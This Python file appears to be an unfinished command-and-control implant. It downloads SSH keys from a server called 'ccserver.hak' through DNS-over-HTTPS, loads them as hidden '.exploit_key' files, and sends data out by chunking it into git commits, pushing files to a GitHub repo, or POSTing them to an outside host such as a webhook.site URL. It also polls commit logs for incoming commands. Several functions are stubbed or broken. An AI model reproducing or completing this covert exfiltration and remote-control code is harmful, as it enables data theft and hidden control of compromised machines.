from os import listdir
import subprocess

DNS_RESOLVER="https://dns.google/dns-query"

SERVER="ccserver.hak"
PUB_KEY="id_rsa.pub"
PRV_KEY="id_rsa"

USER="ivlin"
REPO="commtest"
MAX_MSG_LEN = 50 #determined by the max commit length
MAX_FILESIZE = 800	

def fetch_keys(server_name):
	""" Downloads the keys from the server using the get_https_file command. For  """
	get_https_file("%s/%s"%(SERVER,PUB_KEY), PUB_KEY)
	get_https_file("%s/%s"%(SERVER,PRV_KEY), PRV_KEY)

def init_git_keys():
	""" Takes the key files and saves it to the ssh agent """
	keynames = listdir("~/.ssh")
	index=1
	while (".exploit_key_%d"%index) in keynames or  (".exploit_key_%d.pub"%index) in keynames:
		index+=1
	subprocess.run(["bash","load_key.sh",(".exploit_key_%d"%index)])

def send_commit_message(msg):
	""" Break up a message and send it as a series of commits. """
	while len(msg) > 0:
		subprocess.run(["bash","transmit_msg.sh", USER, REPO, msg[:50]])
		msg=msg[50:]

def get_commit_message():
	""" Pulls the directory and checks the commit log for changes (new commands) """
	subprocess.run(["bash","pull_commits.sh", USER, REPO])
	with open("commitlog","r") as f:
		# parse for commands
		pass
		with open("commitlog.prev","w") as prev:
			prev.write(f.read())

def send_git_file(fname):
	""" Upload a file to the github """
	subprocess.run(["bash","push_file.sh", USER, REPO, fname])

def get_https_file(url, fname):
	""" GETS a file at url and stores it locally at fname. DNS done through HTTPS. """
	subprocess.run(["curl","--doh-url", DNS_RESOLVER, url], stdout=fname)

def send_https_file(file, dest, resolver):
	""" Sends a post request with file as the body. DNS done through HTTPS. """
	subprocess.run(["bash","doh_send.sh", file, dest, resolver]) #Can't call the command directly from python for some reason

def send(body, is_file=False):
	""" Based on network conditions and msg size, choose an appropriate way to transmit a message """
	
	if False:
		send_commit_message(body)
	elif False:
		send_git_file()
	elif False:
		send_https_file()
	pass

def recv(remote_url):
	""" Based on network conditions and msg size, choose an appropriate way to send the file """
	if False:
		get_https_file()
	pass

if __name__=="__main__":
	send_git_file("test.json")
	#send_https_file("test.json","https://webhook.site/ff3193e4-77b4-42c7-8787-afb64168e494")	
	#send_commit_message("Test")